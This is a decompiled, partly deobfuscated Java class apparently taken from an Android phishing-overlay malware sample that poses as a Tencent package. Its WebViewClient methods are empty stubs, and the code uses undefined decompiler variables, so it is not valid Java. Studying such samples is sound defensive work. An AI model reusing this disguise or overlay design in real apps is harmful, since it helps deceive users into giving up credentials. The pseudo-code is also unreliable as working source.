package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: PhishingOverlayActivity_MyWebViewClient
 * Original: Lcom/tencent/withdrawalhskfdisagreed3$MyWebViewClient;
 */
class PhishingOverlayActivity_MyWebViewClient extends WebViewClient {

    // === FIELDS ===
    final PhishingOverlayActivity this$0;

    // === METHODS ===

    private void Constructor(PhishingOverlayActivity param0) {
        v0.this$0 = v1;
        // new WebViewClient()
        return;
    }

     void Constructor(PhishingOverlayActivity param0, PhishingOverlayActivity$1 param1) {
        // new PhishingOverlayActivity$MyWebViewClient(v1)
        return;
    }

    public void onPageFinished(WebView param0, String param1) {
        return;
    }

    public boolean shouldOverrideUrlLoading(WebView param0, String param1) {
        v1 = 0;
        return 0;
    }
}
